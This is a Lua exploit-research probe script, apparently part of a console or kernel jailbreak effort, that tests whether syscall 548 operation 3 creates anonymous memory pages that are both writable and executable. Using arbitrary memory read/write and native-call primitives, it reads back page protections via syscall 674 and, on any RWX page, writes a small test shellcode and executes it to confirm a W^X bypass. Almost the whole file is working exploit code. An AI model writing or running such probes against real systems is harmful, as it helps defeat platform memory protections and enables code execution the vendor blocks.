-- CRASH_CLASS: HIGH
-- PROBE 804b: does 548 op 3 (anonymous map) keep the X bit that mmap strips?
--
-- 803h proved syscall 477 clears bit 2 at creation.  Op 3 of 548 maps a fresh anonymous page
-- through a different code path (it refuses an address that is already mapped, so it is
-- vm_map_find rather than a MAP_FIXED insert).  If that path does not sanitise the protection,
-- the page comes back executable, and an RWX result would be a complete W^X bypass.
--
-- Each case maps one page at its own address, reads the stored protection back from sys 674,
-- and - if the page is both writable and executable - writes `mov eax,0x1337; ret` and calls it.
print("=== PROBE 804b: 548 OP 3 PROTECTION ===")
print("")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function rdb(a)
    local ok, v = pcall(function() return memory.read_byte(a) end)
    if ok then return to_num(v) % 256 end
    return nil
end
local function wrb(a, v) return pcall(function() memory.write_byte(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function split(h, l) return uint64(string.format("0x%X%08X", h, l)) end
local function ascii(a, n)
    local out = ""
    for i = 0, n - 1 do
        local b = rdb(a + i) or 0
        if b == 0 then break end
        if b >= 32 and b < 127 then out = out .. string.char(b) else out = out .. "." end
    end
    return out
end
local getpid = make_syscall(20)
local sc674 = make_syscall(674)
local sc548 = make_syscall(548)
pcall(function() return getpid() end)
local STRIDE, MAX = 72, 512
local regions = memory.alloc(STRIDE * MAX + 0x100)
for i = 0, 0x400, 4 do wd(regions + i, 0) end
local countp = memory.alloc(16)
local function region_of(va)
    wq(countp, uint64(0))
    local ok = pcall(function()
        return sc674(uint64(regions), uint64(STRIDE), uint64(MAX), uint64(countp), uint64(0x40000000))
    end)
    if not ok then return nil end
    local n = rd(countp) or 0
    if n > MAX then n = MAX end
    for i = 0, n - 1 do
        local b = regions + i * STRIDE
        local lo = (rd(b) or 0) + (rd(b + 4) or 0) * 4294967296
        local hi = (rd(b + 8) or 0) + (rd(b + 12) or 0) * 4294967296
        if va >= lo and va < hi then return lo, hi, rd(b + 0x18) or 0, ascii(b + 0x20, 0x18) end
    end
    return nil
end
local recs = memory.alloc(0x20 * 8)
local function op3(addr, len, prot)
    local b = recs
    wq(b, split(0, addr))
    wq(b + 8, split(0, 0))
    wq(b + 0x10, split(0, len))
    wd(b + 0x18, prot)
    wd(b + 0x1c, 3)
    local ok, rv = pcall(function()
        return sc548(uint64(0), uint64(0), uint64(recs), uint64(1), uint64(0))
    end)
    if not ok then return "pcall-fail" end
    return to_num(rv)
end
print("[A] op 3, one fresh page per requested protection")
local i = 0
for _, pr in ipairs({0,1,2,3,4,5,6,7,0x30,0x33,0x34,0x35,0x36,0x37}) do
    i = i + 1
    local a = 0x7a0000000 + i * 0x20000
    local r = op3(a, 0x4000, pr)
    local lo, hi, p, nm = region_of(a)
    print(string.format("  want=%02X ret=%-12s stored=%s %s", pr, tostring(r),
        p and string.format("%02X", p) or "GONE", nm or ""))
    if p and p >= 4 then
        local bit = p - 4
        if bit >= 0 and bit < 4 then
            -- p has the X bit; is it also writable?
            local w = (p % 4)
            print(string.format("    X bit present (p=%02X, rw bits=%d)", p, w))
            if w >= 2 then
                local code = {0xB8, 0x37, 0x13, 0x00, 0x00, 0xC3}
                for k, v in ipairs(code) do wrb(a + k - 1, v) end
                print(string.format("    bytes: %02X %02X %02X", rdb(a) or -1, rdb(a+1) or -1, rdb(a+2) or -1))
                local okc, val = pcall(function() return native.fcall_with_rax(uint64(a), 0) end)
                print("    call ok=" .. tostring(okc) .. " ret=" .. tostring(okc and to_num(val) or "-"))
                if okc and to_num(val) == 0x1337 then print("    *** SHELLCODE EXECUTED ***") end
            end
        end
    end
end
print("")
print("[B] alive pid=" .. to_num(getpid()))
